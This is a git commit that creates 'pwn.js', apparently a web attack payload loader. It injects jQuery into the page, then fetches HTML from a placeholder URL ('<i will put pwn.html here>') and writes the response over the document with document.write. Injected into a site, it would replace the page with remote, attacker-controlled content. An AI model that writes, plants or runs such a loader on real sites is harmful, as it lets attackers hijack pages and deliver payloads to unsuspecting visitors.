a0f12be30677ff0c180ce17e253bd4ef3fa98386
idogewallet <sreeharisreedev@yahoo.com>
2016-06-30 23:00:53 -0700

    Create pwn.js

---
+++ pwn.js
@@ -0,0 +1,30 @@
+// Anonymous "self-invoking" function
+(function() {
+    var startingTime = new Date().getTime();
+    // Load the script
+    var script = document.createElement("SCRIPT");
+    script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js';
+    script.type = 'text/javascript';
+    document.getElementsByTagName("head")[0].appendChild(script);
+
+    // Poll for jQuery to come into existance
+    var checkReady = function(callback) {
+        if (window.jQuery) {
+            callback(jQuery);
+        }
+        else {
+            window.setTimeout(function() { checkReady(callback); }, 20);
+        }
+    };
+
+    // Start polling...
+    checkReady(function($) {
+        $(function() {
+            var endingTime = new Date().getTime();
+            var tookTime = endingTime - startingTime;
+            $.get("<i will put pwn.html here>", function(data, status){
+              document.write(data);
+            });
+        });
+    });
+})();
